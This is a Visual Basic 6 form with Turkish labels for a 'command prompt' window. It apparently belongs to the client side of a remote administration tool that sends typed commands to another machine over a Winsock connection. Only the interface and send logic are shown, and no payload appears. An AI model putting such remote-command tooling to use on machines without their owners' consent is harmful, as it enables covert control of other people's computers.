VERSION 5.00
Begin VB.Form Form7 
   BackColor       =   &H00000000&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Komut Ýstemi"
   ClientHeight    =   5370
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   9840
   LinkTopic       =   "Form7"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5370
   ScaleWidth      =   9840
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command1 
      Caption         =   "Gönder"
      Height          =   495
      Left            =   8760
      TabIndex        =   2
      Top             =   4800
      Width           =   975
   End
   Begin VB.TextBox Text1 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   0
      MultiLine       =   -1  'True
      TabIndex        =   1
      Text            =   "client_7.frx":0000
      Top             =   4800
      Width           =   8655
   End
   Begin VB.ListBox List1 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   4710
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   9855
   End
End
Attribute VB_Name = "Form7"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
On Error Resume Next
If Text1.Text = "" Then
List1.AddItem (vbNewLine & "    ----BOÞ KOMUT YAZMAYINIZ----    ")
Exit Sub
Else
Form1.Winsock1.SendData "komut|" + Text1.Text
List1.AddItem (vbNewLine & Text1.Text & "    ----KOMUT GÖNDERÝLDÝ----")
End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
Form1.Winsock1.SendData "islem|" + "MSDOS KOMUTLARI KAPATILDI"
End Sub
